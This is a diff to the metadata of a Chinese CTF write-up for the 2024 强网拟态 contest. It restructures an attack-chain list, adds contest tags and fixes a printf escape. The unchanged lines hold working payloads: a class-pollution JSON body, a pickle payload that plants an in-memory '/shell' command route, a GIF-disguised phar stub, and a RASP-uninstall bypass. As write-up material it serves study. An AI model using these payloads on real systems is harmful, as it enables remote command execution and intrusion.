@@ -19,7 +19,17 @@ tags:
 - JVM-SANDBOX uninstall RASP
 - 内存马 app.add_route
 - 文件读取 capoo.phar
-attack_chain: 'ez_picker: /register JSON __init__.__globals__ 污染 safe_modules/safe_names/secret_key → pickle reduce eval() 写内存马 add_route(''/shell'') → 上传 1.pkl 触发 → /shell?cmd=cat /tr3e_fl4g_1s_h3re_lol ; capoo: file_get_contents 读 showpic.php 源码 → phar:// + gzip 压缩 GIF89a stub 绕 PILER 检测 → phar:// 反序列化 __wakeup + diff 读 flag ; OnlineRunner: java 不 import 类直接 java.io.FileReader 列目录 → 读 app.jar → 反编译 agent.jar → 调用 com.alibaba.jvm.sandbox.agent.AgentLauncher uninstall RASP → Runtime.exec 通杀'
+attack_chain:
+- 'ez_picker: /register JSON __init__.__globals__ 污染 safe_modules/safe_names/secret_key'
+- 'pickle reduce eval() 写内存马 add_route(''/shell'')'
+- '上传 1.pkl 触发'
+- '/shell?cmd=cat /tr3e_fl4g_1s_h3re_lol ; capoo: file_get_contents 读 showpic.php 源码'
+- 'phar:// + gzip 压缩 GIF89a stub 绕 PILER 检测'
+- 'phar:// 反序列化 __wakeup + diff 读 flag ; OnlineRunner: java 不 import 类直接 java.io.FileReader 列目录'
+- '读 app.jar'
+- '反编译 agent.jar'
+- '调用 com.alibaba.jvm.sandbox.agent.AgentLauncher uninstall RASP'
+- 'Runtime.exec 通杀'
 key_payload: '{"username": 1, "password": 1, "__init__": {"__globals__": {"safe_modules": ["os", "builtins"], "safe_names": ["eval", "popen"], "secret_key": 111}}} ; pickle (eval, (''app.add_route(lambda request: __import__("os").popen(request.args.get("cmd")).read(), "/shell", methods=["GET", "POST"])'',)) ; $phar->setStub("GIF89a"); gzcompress 改 .gif'
 one_liner: 原型链污染 + pickle 内存马 + phar:// 反序列化 + JVM-SANDBOX uninstall。
 lesson: Python 原型链污染必须显式允许 safe_modules=['os','builtins'] 才有效；JVM-SANDBOX 启动时调用 uninstall() 可彻底关掉 RASP。
@@ -76,6 +86,8 @@ prerequisites:
 - phar:// 反序列化 + gzip stub 绕 PILER
 - JVM-SANDBOX 架构与 uninstall API
 - Java Runtime.exec + RASP 绕过
+contest_normalized: "强网拟态"
+contest_year: 2024
 ---
 # 2024 强网拟态 Nepnep WP
 
@@ -1163,7 +1175,7 @@ CPU_SET(core, &cpu_set);
 
 sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 
-printf(“ 33[34m 33[1m[*] Process binded to core  33[0m%dn”, core);
+printf(“\\x0033[34m\\x0033[1m[*] Process binded to core \\x0033[0m%dn”, core);
 
 }
 
